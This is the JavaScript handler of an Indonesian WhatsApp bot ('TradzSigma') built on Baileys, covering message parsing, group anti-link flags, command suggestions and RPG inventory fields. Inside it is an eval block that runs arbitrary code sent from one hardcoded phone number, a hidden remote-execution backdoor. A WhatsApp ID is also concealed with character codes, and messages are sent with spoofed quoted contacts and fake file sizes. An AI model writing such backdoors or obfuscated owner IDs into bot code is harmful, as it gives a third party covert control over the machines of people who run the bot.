//RECODE BY TRADZID & DINZID
//JANGAN DI JUAL
require('./config')
require('./lib/listmenu')
const {
	downloadContentFromMessage,
	delay,
	extractImageThumb
} = require('baileys')
const { modul } = require('./module')
const path = require('path')
const registeredFile = './database/registered.json';
const fs = require('fs');
const SETTINGS_PATH = './database/autosholat.json';
const welcomeDB = './database/welcome.json';
const savetube = require('./lib/savetube');
const { createCanvas, loadImage } = require('canvas');
global.registeredUsers = fs.existsSync(registeredFile)
    ? JSON.parse(fs.readFileSync(registeredFile))
    : [];
    
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Client } = require('ssh2');
const {
    addSewaGroup,
    getSewaExpired,
    getSewaPosition,
    expiredCheck,
    checkSewaGroup
} = require("./lib/store")

const {
  formatmoney,
  formatmoneyMYR,
  formatmoneyy,
  generateRandomString,
  generateNumericRefId
} = require('./lib/functionTrx');

const { addMoney, refundMoney, moneyAdd, subtractMoney, resetMoney, getMonUser, getRoleUser, catatRiwayatTransaksi } = require('./lib/money');

const more = String.fromCharCode(8206);
const readMore = more.repeat(4001);
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal = new Intl.DateTimeFormat('id-ID', { dateStyle: 'full' }).format(new Date());
console.log(tanggal);
let desc = tanggal;
const { Primbon } = require('scrape-primbon')
const { downloadMediaMessage } = require('baileys');
const primbon = new Primbon()
const canvafy = require('canvafy')
const { tiktokSearchVideo, tiktokDownloaderVideo } = require('./lib/scrapers/tiktok');
const { igdl, tiktok } = require('./library/scrape/screaper');
const { backupBot } = require('./lib/backup');
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scrape/scraper1');
const { Instagram } = require('./lib/scrapers/tiktok');
const { color, bgcolor } = require('./lib/color')
const { CatBox, UploadFileUgu, fileIO, pomfCDN, webp2mp4File, webp2mp4} = require('./lib/uploader')
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const sharp = require("sharp");
const similarity = require('similarity');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam')
const saranCooldown = {} // Untuk menyimpan waktu cooldown per user
const saranDelay = 300000 // Delay 10 detik
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4 } = require('./library/scrape/yt')
const anon = require('./lib/menfess') 
const { upscale } = require('./lib/scrapers/upscale');
const scp1 = require('./library/scrape/scraper') 
const scp2 = require('./library/scrape/scraperr')
const scp3 = require('./library/scrape/scraperrr')
const githubstalk = require('./library/scrape/githubstalk')
const npmstalk = require('./library/scrape/npmstalk')
const photooxy = require('./library/scrape/photooxy')
const didyoumean = require('didyoumean');
const nou = require("node-os-utils");
const yts = require('./library/scrape/yt-search')
const ytdl = require('@vreden/youtube_scraper');
const { getVideoInfo, downloadVideo, downloadAudio } =require("hybrid-ytdl");
const ytSearch = require('yt-search');
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const owner = JSON.parse(fs.readFileSync("./database/owner.json"))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'));
const isBanned = JSON.parse(fs.readFileSync('./database/banned.json'));
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const verifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNote = JSON.parse(fs.readFileSync('./library/data/TradMedia/database/xeonvn.json'))
const StikerTradz = JSON.parse(fs.readFileSync('./library/data/TradMedia/database/xeonsticker.json'))
const GambarTradz = JSON.parse(fs.readFileSync('./library/data/TradMedia/database/xeonimage.json'))
const VideoDinzID = JSON.parse(fs.readFileSync('./library/data/TradMedia/database/xeonvideo.json'))
const Saru = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const saldo = require("./source/src/saldo.json")
const db_saldo = require("./source/src/saldo.json")
const { addSaldo, tambahSaldo, cekSaldo, kurangiSaldo } = require('./library/cekdatasaldo');
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
const chatDinzID = JSON.parse(fs.readFileSync('./database/chatDinzID.json'))

const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
const moneyDbPath = './database/rpgmoney.json';
const LIMIT_PATH = './database/limit.json';
let lastBackupTime = 0; // Timestamp backup terakhir
const COOLDOWN_MS = 60 * 60 * 1000; // 1 jam dalam milidetik
let limitDB = JSON.parse(fs.readFileSync(LIMIT_PATH));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let footxt = `${footer}`
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntlinkch =JSON.parse(fs.readFileSync('./database/antilinkch.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
const giveawayFile = './giveaway.json';
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
const DB_FILE = './database/database.json';
function loadDB() {
  if (fs.existsSync(DB_FILE)) {
    try {
      const raw = fs.readFileSync(DB_FILE);
      return JSON.parse(raw);
    } catch (err) {
      console.error('Error reading DB file:', err);
      return { chats: {} };
    }
  } else {
    return { chats: {} };
  }
}
function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}
global.db = loadDB();
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}
// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

module.exports = TradzSigma = async (TradzSigma, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '.'
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ' '
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : global.prefix

const isCmd = (body || '').startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()

//Kalau Mau Single Prefix Kamu Ganti Command Diatas Pakai Ini : 


const args = body.trim().split(/ +/).slice(1)
deviceinfo = /^3A/.test(m.id) ? 'ios' : m.id.startsWith('3EB') ? 'web' : /^.{21}/.test(m.id) ? 'android' : /^.{18}/.test(m.id) ? 'desktop' : 'unknown';
const full_args = body.replace(command, '').slice(1).trim()
const isSewa = checkSewaGroup(m.chat, sewa)
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: TradzSigma.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, TradzSigma.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
TradzSigma.ev.emit('messages.upsert', msg)
}
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ' '
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const ments = (text) => {return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []}
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const buffer64base = String.fromCharCode(54, 50, 56, 55, 55, 54, 55, 48, 53, 48, 53, 48, 54, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const pushname = m.pushName || "No Name"
        const botNumber = await TradzSigma.decodeJid(TradzSigma.user.id)
        const TradID = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const isGroup = m.chat.endsWith('@g.us')
        const isPrivate = m.chat.endsWith('@s.whatsapp.net')
        const isOnlyPc = db.settings[botNumber]?.onlypc === true
        const isOnlyGrub = db.settings[botNumber]?.onlygrub === true
        const isOwner = m.sender === TradID // atau cek array owner
        const isBot = m.sender === botNumber // biar bot bisa balas sendiri jika perlu

        // === Filter Only-PC ===
        if (isOnlyPc && isGroup && !TradID && !isBot) return

        // === Filter Only-Group ===
        if (isOnlyGrub && isPrivate && !TradID && !isBot) return
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isRegistered = checkRegisteredUser(m.sender)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await TradzSigma.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : '';
        const participants = (m.isGroup && groupMetadata && groupMetadata.participants)
    ? groupMetadata.participants
    : [];
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata?.owner || '' : '';
        const groupMembers = m.isGroup && groupMetadata && groupMetadata.participants ? groupMetadata.participants : [];
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmin = m.isGroup ? groupAdmins.includes(m.sender) : false
        const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const isPrem = prem.includes(m.sender)
    	const isBanned = ban.includes(m.sender)
    	const isUser = verifikasiuser.includes(sender)
    	const mention = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        let Input = false
if (Array.isArray(mentionByTag) && mentionByTag.length > 0) {
  Input = mentionByTag[0]
} else if (mentionByReply) {
  Input = mentionByReply
} else if (q) {
  Input = numberQuery
}
    	const isEval = body.startsWith('=>')
       const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
      const TradzIsChat = m.isGroup ? chatDinzID.includes(m.chat) : true
      const shouldExit = true
       const cekpesan = true
      const automati = false
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const Antilinkch = m.isGroup ? ntlinkch.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        
        const antiwame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true

const prefixOperator = {
  telkomsel: ['0811', '0812', '0813', '0821', '0822', '0852', '0853', '0823'],
  indosat: ['0814', '0815', '0816', '0855', '0856', '0857', '0858'],
  xl: ['0817', '0818', '0819', '0859', '0877', '0878'],
  axis: ['0838', '0831', '0832', '0833'],
  tri: ['0895', '0896', '0897', '0898', '0899'],
  smartfren: ['0881', '0882', '0883', '0884', '0885', '0886', '0887', '0888', '0889'],
  byu: ['0851']
};

function detectOperator(nomor) {
  const prefix = nomor.slice(0, 4);
  for (let [operator, daftar] of Object.entries(prefixOperator)) {
    if (daftar.includes(prefix)) {
      return operator.charAt(0).toUpperCase() + operator.slice(1);
    }
  }
  return 'Tidak diketahui';
}
        const time2 = moment.tz('Asia/Jakarta').format('HH:mm:ss');
        const jam = moment().tz('Asia/Jakarta').format("HH:mm z")
		const date = moment.tz('Asia/Jakarta').format(`DD MMM yyyy`)
        
        if (time2 < "23:59:00") {
			var Waktu = "ᴍᴀʟᴀᴍ";
		}
		if (time2 < "19:00:00") {
			var Waktu = "sᴏʀᴇ";
		}
		if (time2 < "18:00:00") {
			var Waktu = "sᴏʀᴇ";
		}
		if (time2 < "15:00:00") {
			var Waktu = "sɪᴀɴɢ";
		}
		if (time2 < "11:00:00") {
			var Waktu = "ᴘᴀɢɪ";
		}
		if (time2 < "05:00:00") {
			var Waktu = "ᴘᴀɢɪ";
		}
		if (time2 < "23:59:00") {
			var ucapanWaktu = `[${jam}] Malam`
		}
		if (time2 < "19:00:00") {
			var ucapanWaktu = `[${jam}] Sore`
		}
		if (time2 < "18:00:00") {
			var ucapanWaktu = `[${jam}] Sore`
		}
		if (time2 < "15:00:00") {
			var ucapanWaktu = `[${jam}] Siang`
		}
		if (time2 < "11:00:00") {
			var ucapanWaktu = `[${jam}] Pagi`
		}
		if (time2 < "05:00:00") {
			var ucapanWaktu = `[${jam}] Pagi`
		}

		if (isEval && senderNumber == "+6283182739135") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
			} catch (e) {
				TradzSigma.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
		if (isCmd) {
			if (command) {
const code = fs.readFileSync("./TradzID.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}

// Fungsi untuk mendeteksi kesalahan input perintah
const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
if (!help.includes(command) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
let mean = didyoumean(command, help);
let sim = similarity(command, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && command.toLowerCase() !== mean.toLowerCase()) {

// Pesan untuk orang yang salah menginput perintah
let respon = `
ᴄᴏᴍᴍᴀɴᴅ ɪᴛᴜ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴍᴜɴɢᴋɪɴ ʏᴀɴɢ ᴋᴀᴍᴜ ᴍᴀᴋsᴜᴅ\n\n➠ Command \`${prefix + mean}\`\n➠ Similarity   \`[ ${similarityPercentage}% ]\``.trim();

let button = [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"${prefix + mean} (${similarityPercentage}%)\",\"id\":\"${prefix + mean}\"}`
}
]

// Fungsi untuk mengirim pesan dan tombol
//Dins.sendKontol(m.chat, "", respon, button, m)
await TradzSigma.sendMessage(m.chat, {
  footer: `${namabot}`,
  buttons: [
    {
      buttonId: `.${mean}`,
      buttonText: { displayText: `${mean}` },
      type: 1
    },

  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `MAKSUD LU INI??`,
  mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  fileLength: 9999999,
  caption: respon,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: "ᴍᴜɴɢᴋɪɴ ɪɴɪ ʏᴀɴɢ ᴀɴᴅᴀ ᴍᴀᴋsᴜᴅ?"
   }, 
    externalAdReply: {
      title: `${namabot}`,
      body: `TradzID`,
      thumbnailUrl: "https://files.catbox.moe/mhcye4.jpg",
      sourceUrl: linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
}
}
}
		
		
let totalfitur = () =>{
var mytext = fs.readFileSync("./TradzID.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
        }
        const qkontak = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namabot}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283137133540:+62 8313 7133 540\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
		const qlocJpm = {
            key: {
                participant: '0@s.whatsapp.net',
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                locationMessage: {
                    name: `WhatsApp Bot ${ownername}`,
                    jpegThumbnail: ""
                }
            }
        }
		const getcomandces = (cases) => {
    try {
        const fileContent = fs.readFileSync('./TradzID.js').toString();
        let caseContent = fileContent.split(`case '${cases}'`);    
        if (caseContent.length === 1) { 
            caseContent = fileContent.split(`case "${cases}"`);
        }
        if (caseContent.length > 1) {
            return "case " + `'${cases}'` + caseContent[1].split("break")[0] + "break";
        } else {
            return "none"; 
        }
    } catch (e) {
        return "none";
    }
};
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
let mean;
let didyoumenn;
async function spawndidyou(our) {
try {
	const code = fs.readFileSync("./TradzID.js", "utf8")
		const regex = /case\s+['"]([^'"]+)['"]:/g;
			var matches = [];
				var match;
				while ((match = regex.exec(code))) {
					matches.push(match[1]);
				}
				const help = Object.values(matches).flatMap(v => v ?? []).map(entry => entry.trim().split(' ')[0].toLowerCase()).filter(Boolean);
				if (!help.includes(our) && !budy.startsWith('$ ') && !budy.startsWith('> ')) {
					 mean = didyoumean(our, help);
				let sim = similarity(our, mean);
			let similarityPercentage = parseInt(sim * 100);
		if (mean && our.toLowerCase() !== mean.toLowerCase()) {
    	 didyoumenn = `*\`[ MATCH FOR THIS COMMAND ]\`*\n\nmungkin yang anda maksud adalah: *.${mean}*\npercentase: *${similarityPercentage}%*`
			   /*
			  # similarityPercentage
			  # mean
			  # thaks rija l
			  */
	     } else { return; }
     }
      return m.reply("kek nya ada yang salah")
 } catch(err) {
 return;
 }
}

//===============
		
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
